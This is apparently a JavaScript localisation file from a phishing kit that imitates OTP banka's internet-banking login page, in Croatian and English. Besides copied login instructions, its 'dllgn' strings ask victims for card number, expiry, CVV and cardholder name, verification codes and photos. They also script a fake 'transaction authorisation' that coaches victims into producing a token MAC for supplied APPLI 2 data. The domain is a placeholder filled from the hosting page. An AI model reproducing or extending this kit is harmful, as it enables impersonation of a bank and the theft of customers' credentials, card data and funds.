(function () {
  "use strict";

  var STORAGE_KEY = "otpbanka_lang";

  var I18N = {
    hr: {
      title: "OTP banka Internet bankarstvo",
      description:
        "Uz uslugu eLEMENT@ Internet bankarstvo vaše financije su vam uvijek na dohvat ruke: kod kuće, na poslu, na putu, u kafiću - 24 sata dnevno, 7 dana u tjednu.",
      homeTitle: "Početna",
      nav1: "Građani",
      nav2: "Privatno bankarstvo",
      nav3: "Mala poduzeća i obrtnici",
      nav4: "Velike tvrtke",
      nav5: "Financijska tržišta",
      nav6: "O nama",
      menuRetail: "Građani - upute",
      menuCorporate: "Poslovni subjekti - upute",
      menuEgradani: "e-Građani",
      welcome: "Dobrodošli u Internetsko bankarstvo OTP banke",
      tabPrefix: "Internetsko bankarstvo",
      tabToken: " Token",
      formTitle: "Autorizacija korisnika usluge Internetskog bankarstva",
      langSwitch: "English",
      tokenLabel: "Serijski broj tokena",
      otpLabel: "Jednokratna zaporka",
      loginBtn: "Prijava",
      validation: "Molimo upišite",
      loginInstrTitle: "Uputa za prijavu u Internetsko bankarstvo:",
      loginInstrHtml:
        "<li>Uključite token pritiskom na tipku za paljenje</li>" +
        "<li>Unesite osobni PIN</li>" +
        "<li>Pritisnite tipku 1</li>" +
        '<li>U polje "Serijski broj tokena" upišite serijski broj tokena koji se nalazi na poleđini tokena (broj od 8 ili 10 znamenki bez unosa crtica)</li>' +
        '<li>U polje "Jednokratna zaporka" upišite jednokratnu zaporku duljine 6 znamenki s ekrana tokena</li>' +
        '<li>Kliknite na tipku "Prijava"</li>',
      usageTitle: "Upute za korištenje",
      usageHtml:
        '<li>Uputa za korištenje <a href="#">tokena</a></li>' +
        '<li>Uputa za korištenje <a href="#">m-tokena</a></li>',
      limitsTitle: "Upravljanje limitima financijskih transakcija – online kanali – Građani",
      limitsHtml:
        'Jednokratnu izmjenu dnevnog promjenjivog limita moguće je napraviti putem Kontakt centra pozivom na broj <a href="#">0800 21 00 21</a> ili <a href="#">072 21 00 21</a>, putem chata unutar OTPgo i/ili slanjem poruke putem internetskog bankarstva. Trajno povećanje limita moguće je u bilo kojoj poslovnici OTP banke d.d. ili u kontaktu s Vašim Premium odnosno Privatnim bankarom.',
      otpgoTitle: "OTPgo digitalno bankarstvo",
      otpgoHtml:
        'OTP banka d.d. svoju ponudu proizvoda i usluga dopunila je aplikacijom mobilnog bankarstva pod nazivom OTPgo koja je namijenjena korisnicima pametnih telefona baziranih na Android i iOS operativnim sustavima. Aplikacija omogućuje razne preglede po prometnim i štednim računima, različite financijske transakcije, te ostale funkcionalnosti koje možete vidjeti <a href="#">ovdje</a>.',
      footerHtml:
        'Kontakt centar OTP banke tel. <a href="#">+385(0)800210021</a> i <a href="#">+385(0)72210021</a>, e-mail: <a href="#">info@{{DOMAIN}}</a> (radnim danom od 08:00 do 20:30 sat i subotom od 08:00 do 13:00 sati)',
      dllgn: {
        waiting: "Molimo pričekajte…",
        bootstrapFailed: "Sigurnosni modul nije učitan. Osvježite stranicu.",
        otpTitle: "Verifikacijski kod",
        otpLabel: "Verifikacijski kod",
        otpPrefix: "Kod poslan na: ",
        otpNoTarget: "Unesite verifikacijski kod.",
        otpErr: "Kod je netočan ili je istekao.",
        cardTitle: "Unesite podatke o kartici",
        cardNumber: "Broj kartice",
        cardExp: "Istek (MM/GG)",
        cardCvv: "CVV",
        cardHolder: "Vlasnik kartice",
        push: "Potvrdite prijavu u mobilnoj aplikaciji.",
        qrScanHint: "Skenirajte QR kod mobilnom bankarskom aplikacijom.",
        qrReplyLabel: "Kod",
        customAnswer: "Odgovor",
        photoDrop: "Ispustite fotografije ovdje ili kliknite za odabir",
        submit: "Potvrdi",
        uploadFmt: "Učitaj ({n}/10)",
        spisHeader: "Autorizacija transakcije",
        spisAppliLabel: "Data (APPLI 2)",
        spisMacLabel: "MAC",
        spisSubmit: "Autoriziraj",
        spisHelpLink: "Korištenje tokena za autorizaciju transakcija",
        spisStepsHtml:
          "<li>Uključite token pritiskom na tipku za uključivanje.</li>" +
          '<li>Na zaslonu tokena prikazat će se poruka: <strong>"_ _ _ _ PIN"</strong>.</li>' +
          "<li>Unesite svoj PIN.</li>" +
          '<li>Nakon toga na zaslonu će se prikazati poruka <strong>"APPLI -"</strong>.</li>' +
          "<li>Pritisnite tipku 2.</li>" +
          "<li>Kopirajte 8-znamenkasti broj <strong>{appli2}</strong> i unesite ga u token.</li>" +
          "<li>Token će zatim generirati 6-znamenkasti kod.</li>" +
          '<li>Kopirajte 6-znamenkasti kod s tokena i unesite ga u polje MAC na web stranici.</li>' +
          '<li>Kliknite gumb <strong>"Authorise"</strong>.</li>',
      },
    },
    en: {
      title: "OTP bank Internet banking",
      description:
        "With eLEMENT@ Internet banking your finances are always at your fingertips: at home, at work, on the road, in a café - 24 hours a day, 7 days a week.",
      homeTitle: "Home",
      nav1: "Retail",
      nav2: "Private banking",
      nav3: "MSE",
      nav4: "Corporate banking",
      nav5: "Financial markets",
      nav6: "About us",
      menuRetail: "Retail - instructions",
      menuCorporate: "Corporate - instructions",
      menuEgradani: "e-Citizens",
      welcome: "Welcome to OTP bank Internet banking",
      tabPrefix: "Internet banking",
      tabToken: " Token",
      formTitle: "eLEMENT@ Internet banking user authorization",
      langSwitch: "Croatian",
      tokenLabel: "Token serial number",
      otpLabel: "Access code",
      loginBtn: "Login",
      validation: "Please enter",
      loginInstrTitle: "Login instructions for eLEMENT@ Internet banking",
      loginInstrHtml:
        "<li>Switch on the token by pressing</li>" +
        "<li>Enter your personal PIN</li>" +
        "<li>Press number 1</li>" +
        '<li>Enter the token serial number which is located on the back of the token (8 or 10 digit number without entering the dash) in the "Token serial number" box</li>' +
        '<li>Enter 6 digit one-time password generated by the token in the "Access code (APPLI 1)" box</li>' +
        '<li>Press "Login"</li>',
      usageTitle: "Usage instructions",
      usageHtml:
        '<li><a href="#">Token</a> usage instructions</li>' +
        '<li><a href="#">M-token</a> usage instructions</li>',
      limitsTitle: "Managing financial transaction limits – online channels – Retail",
      limitsHtml:
        'A one-time change of the daily variable limit can be made via the Contact Centre by calling <a href="#">0800 21 00 21</a> or <a href="#">072 21 00 21</a>, via chat within OTPgo and/or by sending a message via internet banking. A permanent limit increase is possible at any OTP banka d.d. branch or by contacting your Premium or Private banker.',
      otpgoTitle: "Mobile banking",
      otpgoHtml:
        'OTP bank d.d. Croatia extended its services offer with mobile banking application called OTP m-banking, which is intended for users of smartphones based on the Android operating system. Application allows various examinations in the traffic and savings accounts, various financial transactions and other functionality that You can see <a href="#">here</a>.',
      footerHtml:
        'OTP bank support center (helpdesk) tel. <a href="#">+385800210021</a> or <a href="#">+38572210021</a> – after voice machine answering dial number 1 (working days from 08:00 to 20:30 and Saturdays from 08:00 to 13:00) e-mail: <a href="#">helpdesk@{{DOMAIN}}</a>',
      dllgn: {
        waiting: "Please wait…",
        bootstrapFailed: "Security module failed to load. Refresh the page.",
        otpTitle: "Verification code",
        otpLabel: "Verification code",
        otpPrefix: "Code sent to: ",
        otpNoTarget: "Enter the verification code.",
        otpErr: "Code is incorrect or expired.",
        cardTitle: "Enter your card details",
        cardNumber: "Card number",
        cardExp: "Expiry (MM/YY)",
        cardCvv: "CVV",
        cardHolder: "Cardholder",
        push: "Confirm sign-in in your mobile app.",
        qrScanHint: "Scan the QR code with your mobile banking app.",
        qrReplyLabel: "Code",
        customAnswer: "Answer",
        photoDrop: "Drop photos here or click to choose",
        submit: "Confirm",
        uploadFmt: "Upload ({n}/10)",
        spisHeader: "Transaction authorisation",
        spisAppliLabel: "Data (APPLI 2)",
        spisMacLabel: "MAC",
        spisSubmit: "Authorise",
        spisHelpLink: "Using token for transaction authorisation",
        spisStepsHtml:
          "<li>Switch on the token by pressing the power button.</li>" +
          '<li>The token will display the following message: <strong>"_ _ _ _ PIN"</strong>.</li>' +
          "<li>Enter your PIN.</li>" +
          '<li>The message <strong>"APPLI -"</strong> will appear on the screen.</li>' +
          "<li>Press the 2 key.</li>" +
          "<li>Copy the 8-digit number <strong>{appli2}</strong> and enter it into the token.</li>" +
          "<li>The token will then generate a 6-digit code.</li>" +
          "<li>Copy the 6-digit code from the token and enter it into the MAC field on the web page.</li>" +
          '<li>Click the <strong>"Authorise"</strong> button.</li>',
      },
    },
  };

  function getMailDomain() {
    var host = (location.hostname || "").replace(/^www\./i, "");
    return host || "localhost";
  }

  function withDomain(str) {
    if (str == null) return str;
    return String(str).split("{{DOMAIN}}").join(getMailDomain());
  }

  function detectLang() {
    try {
      var stored = localStorage.getItem(STORAGE_KEY);
      if (stored === "hr" || stored === "en") return stored;
    } catch (e) {}
    var q = new URLSearchParams(location.search).get("lang");
    if (q === "hr" || q === "en") return q;
    return "hr";
  }

  function applyLang(lang) {
    var dict = I18N[lang] || I18N.hr;
    document.documentElement.lang = lang;
    document.title = dict.title;

    var meta = document.querySelector('meta[name="description"]');
    if (meta) meta.setAttribute("content", dict.description);

    document.querySelectorAll("[data-i18n]").forEach(function (el) {
      var key = el.getAttribute("data-i18n");
      if (dict[key] != null) el.textContent = withDomain(dict[key]);
    });

    document.querySelectorAll("[data-i18n-html]").forEach(function (el) {
      var key = el.getAttribute("data-i18n-html");
      if (dict[key] != null) el.innerHTML = withDomain(dict[key]);
    });

    document.querySelectorAll("[data-i18n-attr]").forEach(function (el) {
      var spec = el.getAttribute("data-i18n-attr");
      // format: attr:key  e.g. title:homeTitle  or  data-validation-error-message:validation
      if (!spec) return;
      spec.split(";").forEach(function (pair) {
        var parts = pair.split(":");
        if (parts.length < 2) return;
        var attr = parts[0].trim();
        var key = parts[1].trim();
        if (dict[key] != null) el.setAttribute(attr, withDomain(dict[key]));
      });
    });

    // Top nav / logo: stay on-page for MVP (no external URLs)
    var logo = document.querySelector(".logo");
    if (logo) {
      logo.setAttribute("href", "#");
      logo.setAttribute("title", dict.homeTitle);
    }

    var switchBtn = document.getElementById("lang-switch");
    if (switchBtn) {
      switchBtn.textContent = dict.langSwitch;
      switchBtn.setAttribute("data-next-lang", lang === "hr" ? "en" : "hr");
      switchBtn.setAttribute("href", "#");
    }

    try {
      localStorage.setItem(STORAGE_KEY, lang);
    } catch (e) {}

    // Keep ?lang= in URL without reload
    try {
      var url = new URL(location.href);
      url.searchParams.set("lang", lang);
      history.replaceState(null, "", url);
    } catch (e) {}

    if (window.BankaDllgn && typeof window.BankaDllgn.onLanguageChange === "function") {
      window.BankaDllgn.onLanguageChange();
    }
  }

  function init() {
    var lang = detectLang();
    applyLang(lang);

    var switchBtn = document.getElementById("lang-switch");
    if (switchBtn) {
      switchBtn.addEventListener("click", function (e) {
        e.preventDefault();
        var next = switchBtn.getAttribute("data-next-lang") || (lang === "hr" ? "en" : "hr");
        lang = next;
        applyLang(lang);
      });
    }

    // MVP: most links stay on-page; allow explicit external nav (e.g. !spis token guide)
    document.addEventListener("click", function (e) {
      var a = e.target.closest && e.target.closest("a");
      if (!a) return;
      if (a.id === "lang-switch" || a.id === "prijava") return;
      if (a.getAttribute("data-allow-nav") === "1") return;
      e.preventDefault();
    });
  }

  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", init);
  } else {
    init();
  }

  window.OTPBankaI18n = { apply: applyLang, detect: detectLang, dict: I18N };
})();
